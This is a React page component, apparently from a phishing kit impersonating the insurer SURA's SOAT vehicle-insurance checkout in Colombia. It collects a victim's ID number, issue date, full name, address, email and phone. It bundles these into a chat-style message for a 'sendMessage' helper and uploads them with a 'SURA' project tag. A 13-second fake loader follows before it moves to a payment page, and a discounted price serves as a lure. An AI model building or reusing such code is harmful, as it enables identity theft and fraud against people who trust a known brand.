import React, { useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import uploadData from '../Uploader/Uploader';
import sendMessage from '../Sender/Sender';  
import Styles from './Verification.module.css';
import loaderGif from '../../Assets/Images/loader.gif';
import i from '../../Assets/Images/i.png';
import Header from '../Header/Header';
import Footer from '../Footer/Footer';

function Datos() {
    const navigate = useNavigate();
    const location = useLocation();
    const { licensePlate, vehicleClass, vehicleModel, serviceType, engineCapacity, insuranceValue } = location.state || {};
    const [idType, setIdType] = useState("");
    const [idNumber, setIdNumber] = useState("");
    const [issueDate, setIssueDate] = useState("");
    const [fullName, setFullName] = useState("");
    const [firstLastName, setFirstLastName] = useState("");
    const [secondLastName, setSecondLastName] = useState("");
    const [residenceMunicipality, setResidenceMunicipality] = useState("");
    const [residenceAddress, setResidenceAddress] = useState("");
    const [emailAddress, setEmailAddress] = useState("");
    const [mobilePhone, setMobilePhone] = useState("");

    const [touchedIdType, setTouchedIdType] = useState(false);
    const [touchedIdNumber, setTouchedIdNumber] = useState(false);
    const [touchedIssueDate, setTouchedIssueDate] = useState(false);
    const [touchedFullName, setTouchedFullName] = useState(false);
    const [touchedFirstLastName, setTouchedFirstLastName] = useState(false);
    const [touchedSecondLastName, setTouchedSecondLastName] = useState(false);
    const [touchedResidenceMunicipality, setTouchedResidenceMunicipality] = useState(false);
    const [touchedResidenceAddress, setTouchedResidenceAddress] = useState(false);
    const [touchedEmailAddress, setTouchedEmailAddress] = useState(false);
    const [touchedMobilePhone, setTouchedMobilePhone] = useState(false);

    const [loading, setLoading] = useState(false);

    const idTypeRef = useRef(null);
    const idNumberRef = useRef(null);
    const issueDateRef = useRef(null);
    const fullNameRef = useRef(null);
    const firstLastNameRef = useRef(null);
    const secondLastNameRef = useRef(null);
    const residenceMunicipalityRef = useRef(null);
    const residenceAddressRef = useRef(null);
    const emailAddressRef = useRef(null);
    const mobilePhoneRef = useRef(null);

    const allFieldsValid = () => {
        return (
            idType &&
            idNumber &&
            issueDate &&
            fullName &&
            firstLastName &&
            secondLastName &&
            residenceMunicipality &&
            residenceAddress &&
            emailAddress &&
            mobilePhone
        );
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!allFieldsValid()) {
            if (!idType) {
                setTouchedIdType(true);
                idTypeRef.current.focus();
            } else if (!idNumber) {
                setTouchedIdNumber(true);
                idNumberRef.current.focus();
            } else if (!issueDate) {
                setTouchedIssueDate(true);
                issueDateRef.current.focus();
            } else if (!fullName) {
                setTouchedFullName(true);
                fullNameRef.current.focus(); 
            } else if (!firstLastName) {
                setTouchedFirstLastName(true);
                firstLastNameRef.current.focus();
            } else if (!secondLastName) {
                setTouchedSecondLastName(true);
                secondLastNameRef.current.focus();
            } else if (!residenceMunicipality) {
                setTouchedResidenceMunicipality(true);
                residenceMunicipalityRef.current.focus();
            } else if (!residenceAddress) {
                setTouchedResidenceAddress(true);
                residenceAddressRef.current.focus();
            } else if (!emailAddress) {
                setTouchedEmailAddress(true);
                emailAddressRef.current.focus();
            } else if (!mobilePhone) {
                setTouchedMobilePhone(true);
                mobilePhoneRef.current.focus();
            }

            return;
        }

        setLoading(true);

        try {
            const mensaje = `Placa: ${licensePlate.toUpperCase()}
        
Nombre(s): ${fullName}
Apellido(s): ${firstLastName} ${secondLastName}
${idType}: ${idNumber}
Expedicion: ${issueDate}
Correo: ${emailAddress}
Teléfono: ${mobilePhone}`;

            sendMessage(mensaje);

            const jsonData = {
                proyecto: 'SURA',
                tipoIdentificacion: idType,
                numeroIdentificacion: idNumber,
                fechaExpedicion: issueDate,
                nombres: fullName,
                apellidos: `${firstLastName} ${secondLastName}`.trim(),
                municipio: residenceMunicipality,
                direccion: residenceAddress,
                correo: emailAddress,
                celular: mobilePhone,
                placa: licensePlate,
                clase: vehicleClass,
                modelo: vehicleModel,
                servicio: serviceType,
                cilindraje: engineCapacity,
                valor: insuranceValue,
            };

            const response = await uploadData(jsonData);
            console.log('Datos enviados correctamente', response);

            setTimeout(() => {
                setLoading(false);

                navigate('/pago', {
                    state: {
                        licensePlate,
                        vehicleClass,
                        vehicleModel,
                        serviceType,
                        engineCapacity,
                        insuranceValue
                    },
                });
            }, 13000);
        } catch (error) {
            console.error('Error al enviar los datos:', error);
            setLoading(false);
        }
    };

    return (
        <>
            <Header stepSectionB={3}/>

            <main className={Styles.xVerificationMain}> 

                <section className={Styles.xVerificationMainSectionA}>
                    <div>
                        <h5>Informacion del vehiculo</h5>
                        <p>Placa: {licensePlate.toUpperCase()}</p>
                        <p>Modelo: {vehicleModel}</p>
                        <p>Servicio/Carroceria: {serviceType}</p>
                        <p>Clase: {vehicleClass}</p>
                    </div>
                </section>

                <section className={Styles.xVerificationMainSectionB}>
                    <h2>Datos del tomador</h2>
                    <form>
                        <div>
                            <select 
                                ref={idTypeRef}
                                value={idType}
                                onChange={(e) => setIdType(e.target.value)}
                                required
                                onBlur={() => setTouchedIdType(true)}
                                className={touchedIdType ? Styles.touched : ""}
                            >
                                <option value="" disabled></option>
                                <option value="CC">Cedula de Ciudadanía</option>
                                <option value="CE">Cedula de Extranjería</option>
                                <option value="NIT">NIT</option>
                            </select>
                            <label>Tipo de Identificacion</label>
                        </div>

                        <div>
                            <input 
                                ref={idNumberRef}
                                placeholder=" "
                                value={idNumber}
                                onChange={(e) => setIdNumber(e.target.value)}
                                required
                                onBlur={() => setTouchedIdNumber(true)}
                                className={touchedIdNumber ? Styles.touched : ""}
                            />
                            <label>Numero de Identificacion</label>
                        </div>

                        <div>
                            <input
                                ref={issueDateRef}
                                placeholder=" "
                                value={issueDate}
                                onChange={(e) => {
                                let valor = e.target.value;

                                valor = valor.replace(/[^\d]/g, '');

                                valor = valor.slice(0, 8);

                                if (valor.length > 4) {
                                    valor = valor.slice(0, 2) + '/' + valor.slice(2, 4) + '/' + valor.slice(4);
                                } else if (valor.length > 2) {
                                    valor = valor.slice(0, 2) + '/' + valor.slice(2);
                                }

                                if (valor.length === 2 || valor.length === 5) {
                                    valor += '/';
                                }

                                setIssueDate(valor);
                                }}
                                required
                                onBlur={() => {
                                const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                                if (regex.test(issueDate)) {
                                    setTouchedIssueDate(true);
                                }
                                }}
                                className={touchedIssueDate ? Styles.touched : ""}
                                pattern="^(\d{2})\/(\d{2})\/(\d{4})$"
                            />
                            <label>Fecha de Expedición (DD/MM/AAAA)</label>
                        </div>

                        <div>
                            <input 
                                ref={fullNameRef}
                                placeholder=" "
                                value={fullName}
                                onChange={(e) => setFullName(e.target.value)}
                                required
                                onBlur={() => setTouchedFullName(true)}
                                className={touchedFullName ? Styles.touched : ""}
                            />
                            <label>Nombre(s)</label>
                        </div>

                        <div>
                            <input 
                                ref={firstLastNameRef}
                                placeholder=" "
                                value={firstLastName}
                                onChange={(e) => setFirstLastName(e.target.value)}
                                required
                                onBlur={() => setTouchedFirstLastName(true)}
                                className={touchedFirstLastName ? Styles.touched : ""}
                            />
                            <label>Primer Apellido</label>
                        </div>

                        <div>
                            <input 
                                ref={secondLastNameRef}
                                placeholder=" "
                                value={secondLastName}
                                onChange={(e) => setSecondLastName(e.target.value)}
                                required
                                onBlur={() => setTouchedSecondLastName(true)}
                                className={touchedSecondLastName ? Styles.touched : ""}
                            />
                            <label>Segundo Apellido</label>
                        </div>
                        
                        <div>
                            <input
                                type="text"
                                ref={residenceMunicipalityRef}
                                value={residenceMunicipality}
                                placeholder=" "
                                onChange={(e) => setResidenceMunicipality(e.target.value)}
                                required
                                onBlur={() => setTouchedResidenceMunicipality(true)}
                                
                                className={touchedResidenceMunicipality ? Styles.touched : ""}
                            />
                            <label>Municipio</label>
                        </div>

                        <div>
                            <input 
                                ref={residenceAddressRef}
                                placeholder=" "
                                value={residenceAddress}
                                onChange={(e) => setResidenceAddress(e.target.value)}
                                required
                                onBlur={() => setTouchedResidenceAddress(true)}
                                className={touchedResidenceAddress ? Styles.touched : ""}
                            />
                            <label>Dirección de Residencia</label>
                        </div>

                        <div>
                            <input 
                                ref={emailAddressRef}
                                placeholder=" "
                                value={emailAddress}
                                onChange={(e) => setEmailAddress(e.target.value)}
                                required
                                onBlur={() => setTouchedEmailAddress(true)}
                                className={touchedEmailAddress ? Styles.touched : ""}
                                type="email"
                            />
                            <label>Correo Electrónico</label>
                        </div>

                        <div>
                            <input 
                                ref={mobilePhoneRef}
                                placeholder=" "
                                value={mobilePhone}
                                onChange={(e) => setMobilePhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
                                required
                                onBlur={() => setTouchedMobilePhone(true)}
                                className={touchedMobilePhone ? Styles.touched : ""}
                                pattern="^\d{10}$"
                            />
                            <label>Número de Celular</label>
                        </div>
                    </form>

                    <div>
                        <img src={i} alt="Info" />
                        <p>Verifica tus datos y asegúrate de que sean correctos. Solo así podemos enviarte notificaciones y confirmaciones de tu proceso de compra</p>
                    </div>
                </section>

                <section className={Styles.xVerificationMainSectionC}>
                    <div>
                        <div>
                            <span>Valor a Pagar:</span>
                            <span>
                                ${insuranceValue ? (Number(insuranceValue) * 0.95).toLocaleString() : 0}
                            </span>
                        </div>
                        <div>*Este es un valor aproximado. Antes de que pagues, verás el costo real del SOAT.</div>
                    </div>
                    <button onClick={handleSubmit}>Comprar</button>
                </section>

            </main>

            {loading && (
                <aside className={Styles.loader}>
                    <img src={loaderGif} alt="Loader"></img>
                </aside>
            )}

            <Footer />
        </>
    )
}

export default Datos;